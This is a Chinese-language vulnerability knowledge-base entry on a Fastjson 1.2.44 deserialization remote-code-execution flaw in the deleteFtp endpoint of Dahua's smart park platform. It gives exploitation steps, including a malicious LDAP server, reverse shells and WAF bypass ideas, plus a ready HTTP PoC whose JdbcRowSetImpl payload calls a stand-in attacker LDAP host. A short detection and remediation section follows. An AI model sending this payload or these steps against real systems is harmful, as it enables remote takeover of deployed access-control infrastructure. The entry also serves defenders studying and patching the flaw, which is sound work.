---
id: web-java-component-dahua-swingcardrecord-deleteftp-fastjson
title: 大华智慧园区 deleteFtp 接口 Fastjson 1.2.44 反序列化 RCE（JdbcRowSetImpl JNDI）
type: scenario
domain: web
path: web/java/component
technique: dahua-swingcardrecord-deleteftp-fastjson
aliases:
- 大华智慧园区 Fastjson
- SwingCardRecordController deleteFtp
- fastjson 1.2.44 RCE
- JdbcRowSetImpl JNDI
- CardSolution
- fastjson @type 反序列化
tags:
- java
- dahua
- cardsolution
- fastjson
- deserialization
- jndi
- jdbcrowsetimpl
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: Fastjson 1.2.44
verification:
  verified_by: verifier-V211
  verified_at: '2026-11-07T04:48:59+08:00'
  notes: 已对照原文与 img58-60 核对：/CardSolution/card/accessControl/swingCardRecord/deleteFtp、@RequestBody String ftpUrl、JSON.parseObject(ftpUrl, Map.class)、fastjson-1.2.44.jar 与原文一致；已按原文标记把 affected_versions 设为 Fastjson 1.2.44。未验证点：原文未附 JNDI 回连/命令执行截图，PoC 未实测；高版本 JDK/WAF 会影响利用。
---

## 一句话结论

大华智慧园区 `/CardSolution/card/accessControl/swingCardRecord/deleteFtp` 把请求体 `ftpUrl` 直接交给 `JSON.parseObject(ftpUrl, Map.class)`，项目使用 Fastjson 1.2.44（原文称其为可打通的通杀版本），可用 `@type: com.sun.rowset.JdbcRowSetImpl` + `dataSourceName: ldap://...` 触发 JNDI 注入，加载远程恶意类执行任意代码。

## 原理

- `SwingCardRecordController.deleteFtp` 方法签名为 `@RequestBody String ftpUrl`，方法内 `JSON.parseObject(ftpUrl, Map.class)`。Fastjson 在解析 JSON 时遇到 `@type` 会实例化目标类并调用 setter；1.2.44 在原文中被称为可打通的通杀版本；能否直接实例化 JdbcRowSetImpl 取决于目标是否开启 AutoType 或存在绕过。
- `com.sun.rowset.JdbcRowSetImpl` 的 `setDataSourceName` 只保存 JNDI 名称，`setAutoCommit(true)` 会触发 `connect()` → `InitialContext.lookup(dataSourceName)`；把 `dataSourceName` 指向攻击者控制的 LDAP/RMI 服务，即可在目标加载远程对象/工厂并执行代码（受 JDK 版本与 JNDI 限制影响）。
- 请求体形如 `{"ftpUrl": {"e": {...}, "f": {...}}}`：`JSON.parseObject` 会递归解析嵌套对象中的 `@type`，即使最终只是 `Map`，恶意类也会被实例化并触发 JNDI。`e`/`f` 键名可用其它任意键替代，属于常见的 fastjson 触发结构。
- 为什么成立：fastjson 的 AutoType 在解析阶段处理 `@type`，早于业务逻辑；`JdbcRowSetImpl` 在 classpath 中（JDK 自带 `com.sun.rowset`），且目标可出网访问攻击者 LDAP/RMI 服务。
- 边界：原文只给出 PoC 请求，未附 JNDI 回连/命令执行截图；高版本 JDK（8u191+ / 11+）默认限制远程 codebase，需要本地 gadget 或绕过；目标不出网时 JNDI 不可用。

## 触发条件

- 目标为大华智慧园区平台，`/CardSolution/card/accessControl/swingCardRecord/deleteFtp` 可访问。
- 项目使用 Fastjson 1.2.44（按原文称可打通；需目标开启 AutoType 或存在绕过）。
- 目标可出站访问攻击者控制的 LDAP/RMI 服务（常见 1389/1099/636 等）。
- JDK 版本允许 JNDI 远程加载（低版本 8u191 以下），或有可用的本地 gadget/反序列化链。

## 利用步骤

1. 确认接口存在：POST `/CardSolution/card/accessControl/swingCardRecord/deleteFtp`，`Content-Type: application/json`，请求体为 JSON 字符串。
2. 确认 Fastjson 版本（`fastjson-1.2.44.jar` 或版本探测）；可先发送 `{"@type":"java.lang.Class","val":"..."}` 观察报错差异。
3. 启动恶意 LDAP/RMI 服务（如 JNDIExploit/marshalsec），准备 `JdbcRowSetImpl` 可加载的远程类/本地 gadget。
4. 构造请求体：外层 `ftpUrl` 对象内放 `@type` 为 `com.sun.rowset.JdbcRowSetImpl`、`dataSourceName` 为 `ldap://attacker:1389/Exploit`、`autoCommit: true`。
5. 发送请求，观察 LDAP 服务是否收到回连；成功后执行命令（反弹 shell/写入文件）验证。
6. 若被 WAF 拦截 `@type`，尝试大小写、`@type`、`@type` 嵌套/数组等 fastjson 绕过。

## PoC

```http
POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 224

{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example:1389/Exploit","autoCommit":true}}}
```

```java
// 危险逻辑（示意）
@RequestMapping(value={"/deleteFtp"}, method={RequestMethod.POST})
public void deleteFtp(@RequestBody String ftpUrl, HttpServletRequest request, HttpServletResponse response) {
    Map map = (Map) JSON.parseObject(ftpUrl, Map.class); // fastjson 1.2.44
    ...
}
```

## 变体与关联

- 变体：`JdbcRowSetImpl` 可换 `TemplatesImpl`、`BadAttributeValueExpException`、`c3p0`/`mysql-jdbc` 等 gadget；LDAP 可换 RMI，或 JNDI 注入 + 本地 factory。
- 变体：其它 `JSON.parseObject` 调用点（文章全局搜索到多处）可能同样可打，需逐个确认参数是否外部可控。
- 关联：[[web-java-deser-fastjson-jdbc-rowset]]（Fastjson JdbcRowSetImpl 通用链）、[[web-java-deser-fastjson-c3p0-jndiref-jndi]]、[[web-java-deser-fastjson-recon-version-dependency-probe]]、[[web-java-deser-fastjson-file-protocol-no-egress-rce]]（不出网替代）。
- 边界：高版本 JDK 的 JNDI 信任限制、目标不出网、WAF 拦截 `@type`/`ldap://` 都会导致失败；原文未给出实际命令执行结果。

## 检测与防御

- **检测特征**：请求体包含 `@type`、`JdbcRowSetImpl`、`dataSourceName`、`ldap://`/`rmi://`；目标向外发起 1389/1099/636 连接；fastjson 报错栈中出现 `autoType`/`JdbcRowSetImpl`。
- **修复**：升级 Fastjson 到安全版本并关闭 AutoType（`ParserConfig.getGlobalInstance().setAutoTypeSupport(false)`，使用 safeMode）；对 `parseObject` 使用固定目标类/白名单。
- **加固**：JNDI 限制（`com.sun.jndi.ldap.object.trustURLCodebase=false`、`rmi` 同理）；出站限制 LDAP/RMI；WAF 拦截 `@type`；JDK 升级到 8u191+/11+。
- **边界**：仅关闭 AutoType 仍可能被 `ExpectClass`/缓存绕过，需持续升级并做安全测试。
